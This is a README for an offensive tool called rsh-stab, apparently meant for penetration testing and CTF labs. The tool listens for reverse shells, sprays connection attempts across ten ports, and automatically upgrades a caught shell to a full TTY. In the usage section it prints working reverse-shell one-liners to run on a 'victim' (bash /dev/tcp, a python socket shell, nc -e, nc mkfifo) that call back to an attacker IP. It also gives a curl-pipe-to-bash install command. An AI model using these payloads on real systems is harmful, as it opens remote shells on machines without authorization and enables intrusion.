# rsh-stab

**Reverse shell stabilizer** — raw TTY relay, multi‑technique spray, automatic PTY
upgrade, and SIGWINCH forwarding.  Single Rust binary, zero runtime dependencies.

```bash
# install with one command
curl -sSL https://raw.githubusercontent.com/0xClumzzy/rsh-stab/master/install.sh | bash

# basic listener
rsh-stab 4444

# spray 10 techniques at once, catch the first that connects
rsh-stab --spray 10.10.14.5 4444

# auto‑stabilize on connect
rsh-stab --autoexec 4444

# connect to a bind shell
rsh-stab 10.10.14.5 4444
```

| Flag | Mode |
|---|---|
| `rsh-stab 4444` | Listen for reverse shell |
| `rsh-stab 10.0.0.5 4444` | Connect to bind shell |
| `--spray <ip> [port]` | Open 10 ports, print payloads, catch first callback |
| `--autoexec [port]` | Listen + auto‑send PTY spawn + resize on connect |
| `--help` | Show help |

---

## Why

`nc -lvnp 4444` gives you a shell with no job control, no tab‑completion, broken
arrows, and `Ctrl+C` kills everything.  Fixing it means:

```
python3 -c 'import pty…'  ⇢  Ctrl+Z  ⇢  stty raw -echo  ⇢  fg  ⇢  reset
```

`rsh-stab` automates the whole thing in one binary.

---

## Install

```bash
# one‑liner — downloads prebuilt binary or falls back to cargo
curl -sSL https://raw.githubusercontent.com/0xClumzzy/rsh-stab/master/install.sh | bash

# from source (requires Rust)
git clone https://github.com/0xClumzzy/rsh-stab.git
cd rsh-stab
cargo build --release
strip target/release/rsh-stab
cp target/release/rsh-stab /usr/local/bin/
```

---

## Features

| Feature | What it does |
|---|---|
| **Raw‑mode relay** | Puts your terminal in raw mode automatically — no `stty raw -echo; fg` needed. Restores it on disconnect (even `Ctrl+C`). |
| **Spray** | Opens 10 ports, prints one‑liners for 10 techniques (bash `/dev/tcp`, python3, python2, nc mkfifo, nc `-e`, perl, socat, php, ruby, lua). First callback wins, closes the others, auto‑stabilizes. |
| **Auto‑PTY** | Sends 5 commands in sequence with 300 ms gaps: `python3` PTY, `python` PTY, `script`, `script -q`, `export TERM`, `stty rows/cols`. If one method isn't available, the next takes over. |
| **SIGWINCH** | Terminal resize detected via self‑pipe signal handler. Prints `stty rows N cols M` hint to paste on the victim. |
| **Connect mode** | Works as a bind‑shell client: `rsh-stab <host> <port>`. |
| **Single binary** | ~390 KB stripped, no runtime deps. `libc` only. |

---

## Usage

### Listen for a reverse shell

```bash
# attacker
rsh-stab 4444
```

```bash
# victim — any one of these
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
nc -e /bin/bash 10.10.14.5 4444
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```

Terminal goes raw automatically.  After the victim connects, run
`python3 -c 'import pty;pty.spawn("/bin/bash")'` if you're not using `--autoexec`
or `--spray`.

### Spray — try every technique

```bash
# attacker
rsh-stab --spray 10.10.14.5 4444
```

Opens ports `4444 … 4453`, prints 10 one‑liners, waits.  Paste them on the victim
one at a time.  The first callback closes the other 9 ports and auto‑stabilizes:

```
 Spray mode — listening on ports 4444, 4445, 4446, 4447, 4448, 4449, 4450, 4451, 4452, 4453

   ✓ [port 4444] bash /dev/tcp
     bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

   ✓ [port 4445] python3
     python3 -c 'import socket…'
   …

[+] >>> CONNECTION on port 4444 from 10.10.14.5:4444 <<<
[+] Payload matched: bash /dev/tcp (port 4444)
```

### Auto‑stabilize on connect

```bash
rsh-stab --autoexec 4444
```

Sends the 5‑step stabilization sequence immediately after the victim connects,
then drops into interactive mode.

### Connect to a bind shell

```bash
rsh-stab 10.10.14.5 4444
```

Same raw‑mode relay and SIGWINCH handling, but the tool initiates the connection.

---

## Architecture

```
                    poll()
                     │
     ┌───────────────┼───────────────┐
     │               │               │
 STDIN_FD       SOCKET_FD      SIGWINCH_PIPE
     │               │               │
 write(sock)   write(stdout)    TIOCGWINSZ + hint
```

- Single‑threaded `libc::poll()` event loop
- SIGWINCH delivered via self‑pipe trick (async‑signal‑safe)
- Raw mode entered with `cfmakeraw()` / `tcsetattr()`, original termios restored
  on `Drop`
- Spray mode uses a `Vec<pollfd>` over all listener sockets; first `POLLIN` wins
- No heap allocations in the hot relay path (fixed 4 KiB buffer)

---

## Caveats

- **No encryption** — use `socat OPENSSL‑LISTEN:443` if you need TLS
- **No keep‑alive** — one connection per launch (like `nc -lvnp`)
- **Binary data** — raw relay will echo control bytes to your terminal
- **`SIGKILL`** — kills without `Drop`, terminal stays raw; fix: `stty sane`
